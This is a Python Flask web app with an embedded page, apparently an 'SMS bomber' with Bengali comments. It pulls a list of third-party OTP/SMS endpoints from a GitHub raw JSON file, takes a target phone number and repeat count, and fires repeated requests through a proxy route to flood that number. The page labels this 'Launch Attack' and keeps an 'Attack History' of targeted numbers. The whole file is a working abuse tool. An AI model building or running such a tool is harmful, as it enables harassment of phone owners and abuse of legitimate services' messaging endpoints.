import requests, threading, os, time, random, json, sqlite3
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# 🚩 আপনার দেওয়া গিটহাবের RAW JSON লিঙ্ক
GITHUB_API_URL = "https://raw.githubusercontent.com/RK-SYSTEM1/RK-BOMB/refs/heads/main/api.json"

# ---------- DATABASE SETUP ----------
def init_db():
    conn = sqlite3.connect('bomb_history.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS history 
                   (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                    phone TEXT, amount INTEGER, success INTEGER, 
                    date TEXT)''')
    conn.commit()
    conn.close()

init_db()

def fetch_remote_apis():
    try:
        # গিটহাব থেকে সরাসরি এপিআই লিস্ট নিয়ে আসা
        r = requests.get(GITHUB_API_URL, timeout=10)
        if r.status_code == 200:
            return r.json()
        return []
    except Exception as e:
        print(f"Error fetching APIs: {e}")
        return []

# ---------- UI DESIGN (সেই আগের পপুলার ডিজাইন) ----------
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚡ RK SMS Sender PRO</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700;900&display=swap" rel="stylesheet">
<style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
    body{min-height:100vh; background: linear-gradient(135deg,#0f2027,#203a43,#2c5364); padding:20px; color:#fff;}
    .container{max-width:450px; margin:auto;}
    
    .card{background:rgba(255,255,255,0.12); backdrop-filter:blur(20px); border-radius:25px; padding:25px; box-shadow:0 8px 32px rgba(0,255,255,0.2); border:1px solid rgba(255,255,255,0.1); margin-bottom:20px;}
    h2{text-align:center; font-weight:900; text-shadow:0 0 15px #00f2fe; margin-bottom:5px;}
    .made-by{text-align:center; color:#4facfe; font-size:12px; font-weight:700; margin-bottom:20px; text-transform:uppercase;}
    
    input{width:100%; padding:14px; border-radius:12px; border:none; background:rgba(255,255,255,0.1); color:#fff; margin-bottom:15px; border:1px solid rgba(0,242,254,0.3); outline:none;}
    input:focus{border-color:#00f2fe; background:rgba(255,255,255,0.15);}

    .selection-row{display:flex; justify-content:space-between; margin-bottom:10px; font-size:13px; font-weight:bold;}
    .api-list-box{max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 15px; padding: 10px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);}
    .api-item{display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px;}
    .api-item label{cursor:pointer; flex-grow:1;}
    .api-item input[type="checkbox"]{margin-right:10px; accent-color:#00f2fe;}

    .btn-main{width:100%; padding:18px; border-radius:18px; background:linear-gradient(135deg,#00f2fe,#4facfe); border:none; color:#000; font-weight:900; cursor:pointer; text-transform:uppercase; transition:0.3s; box-shadow:0 5px 15px rgba(0,242,254,0.3);}
    .btn-main:disabled{opacity:0.5; transform:scale(0.98);}

    #report{display:none; text-align:center; margin-top:20px; padding:15px; background:rgba(0,0,0,0.2); border-radius:12px;}
    
    /* History Section */
    .history-card{background:rgba(0,0,0,0.4); border-radius:20px; padding:20px; border:1px solid #333; margin-top:10px;}
    .history-card h3{font-size:16px; margin-bottom:15px; color:#00f2fe; border-left:4px solid #00f2fe; padding-left:10px;}
    .hist-table-wrap{overflow-x:auto;}
    table{width:100%; border-collapse:collapse; font-size:11px;}
    th, td{padding:12px 8px; text-align:left; border-bottom:1px solid #222;}
    th{color:#4facfe; text-transform:uppercase;}
    .success-count{color:#00ff9d; font-weight:bold;}
    .st-icon{font-weight:bold; font-size:14px;}
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <h2>📩 RK Sender</h2>
        <div class="made-by">⚡ RK-SYSTEM1 PREMIUM ⚡</div>

        <input type="text" id="number" placeholder="📞 Phone Number (01XXXXXXXXX)">
        <input type="number" id="amount" placeholder="🔁 Amount" value="1">

        <div class="selection-row">
            <span>SELECT APIs:</span>
            <span onclick="toggleSelectAll()" style="color:#00f2fe; cursor:pointer;" id="selBtn">Select All</span>
        </div>

        <div class="api-list-box" id="apiList">
            <p style="text-align:center; padding:20px; color:#888;">Fetching Cloud APIs...</p>
        </div>

        <button onclick="startAttack()" id="mainBtn" class="btn-main">🚀 Launch Attack</button>
        
        <div id="report">
            ✅ Success: <span id="sCount" style="color:#00ff9d;">0</span> | 
            ❌ Fail: <span id="fCount" style="color:#ff6b6b;">0</span>
        </div>
    </div>

    <div class="history-card">
        <h3>📜 Attack History</h3>
        <div class="hist-table-wrap" id="historyData">
            </div>
    </div>
</div>

<script>
let allAPIs = [];
let isAllSelected = false;

// পেজ লোড হলে এপিআই এবং হিস্ট্রি নিয়ে আসা
async function init() {
    try {
        const res = await fetch('/get_apis');
        allAPIs = await res.json();
        let html = '';
        allAPIs.forEach((api, i) => {
            html += `
            <div class="api-item">
                <label><input type="checkbox" class="api-check" value="\${i}"> \${api.name}</label>
                <span id="st-\${i}" class="st-icon"></span>
            </div>`;
        });
        document.getElementById('apiList').innerHTML = html;
        loadHistory();
    } catch (e) {
        document.getElementById('apiList').innerHTML = "Error loading APIs.";
    }
}

async function loadHistory() {
    const res = await fetch('/get_history');
    const logs = await res.json();
    if(logs.length === 0) {
        document.getElementById('historyData').innerHTML = "<p style='text-align:center; font-size:12px; color:#666;'>No history found.</p>";
        return;
    }
    let table = '<table><tr><th>Target</th><th>Limit</th><th>Success</th><th>Time</th></tr>';
    logs.forEach(l => {
        table += \`<tr><td>\${l.phone}</td><td>\${l.amount}</td><td class="success-count">\${l.success}</td><td>\${l.date}</td></tr>\`;
    });
    document.getElementById('historyData').innerHTML = table + '</table>';
}

function toggleSelectAll() {
    isAllSelected = !isAllSelected;
    document.querySelectorAll('.api-check').forEach(c => c.checked = isAllSelected);
    document.getElementById('selBtn').innerText = isAllSelected ? "Deselect All" : "Select All";
}

async function startAttack() {
    const num = document.getElementById('number').value.trim();
    const amt = parseInt(document.getElementById('amount').value);
    const checkedIdx = Array.from(document.querySelectorAll('.api-check:checked')).map(c => c.value);

    if(!num || isNaN(amt) || checkedIdx.length === 0) {
        alert("নাম্বার দিন এবং অন্তত একটি এপিআই সিলেক্ট করুন!");
        return;
    }

    const btn = document.getElementById('mainBtn');
    btn.disabled = true;
    btn.innerText = "BOMBING...";
    document.getElementById('report').style.display = "block";

    let s = 0, f = 0;
    // রিফ্রেশ স্ট্যাটাস আইকন
    checkedIdx.forEach(idx => document.getElementById(\`st-\${idx}\`).innerText = "");

    for(let r=0; r<amt; r++) {
        for(let idx of checkedIdx) {
            const api = allAPIs[idx];
            try {
                const res = await fetch('/proxy_req', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({api: api, num: num})
                });
                if(res.ok) {
                    s++;
                    document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#00ff9d;'>✔</span>";
                } else {
                    f++;
                    document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#ff6b6b;'>✖</span>";
                }
            } catch {
                f++;
                document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#ff6b6b;'>✖</span>";
            }
            document.getElementById('sCount').innerText = s;
            document.getElementById('fCount').innerText = f;
        }
    }

    // হিস্ট্রি সেভ
    await fetch('/save_history', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({phone: num, amount: amt, success: s})
    });

    btn.disabled = false;
    btn.innerText = "🚀 Launch Attack";
    loadHistory();
    alert("অ্যাটাক সম্পন্ন হয়েছে!");
}

init();
</script>
</body>
</html>
'''

# ---------- BACKEND LOGIC ----------

@app.route('/')
def index():
    return render_template_string(HTML_LAYOUT)

@app.route('/get_apis')
def get_apis():
    return jsonify(fetch_remote_apis())

@app.route('/get_history')
def get_history():
    conn = sqlite3.connect('bomb_history.db')
    cursor = conn.cursor()
    cursor.execute("SELECT phone, amount, success, date FROM history ORDER BY id DESC LIMIT 10")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{'phone': r[0], 'amount': r[1], 'success': r[2], 'date': r[3]} for r in rows])

@app.route('/save_history', methods=['POST'])
def save_history():
    data = request.json
    conn = sqlite3.connect('bomb_history.db')
    conn.execute("INSERT INTO history (phone, amount, success, date) VALUES (?, ?, ?, ?)",
                 (data['phone'], data['amount'], data['success'], datetime.now().strftime("%d %b, %I:%M %p")))
    conn.commit()
    conn.close()
    return "OK"

@app.route('/proxy_req', methods=['POST'])
def proxy_req():
    data = request.json
    api = data['api']
    num = data['num']
    p_no_zero = num.lstrip('0')

    url = api['url'].replace("{phone}", num).replace("{phone_no_zero}", p_no_zero)
    method = api.get('method', 'GET')
    headers = api.get('headers', {})
    
    try:
        if method == "POST":
            body = api.get('body', "").replace("{phone}", num).replace("{phone_no_zero}", p_no_zero)
            try: body_data = json.loads(body)
            except: body_data = body
            r = requests.post(url, json=body_data, headers=headers, timeout=5)
        else:
            r = requests.get(url, headers=headers, timeout=5)
        return "OK" if r.status_code == 200 else "FAIL", r.status_code
    except:
        return "ERROR", 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
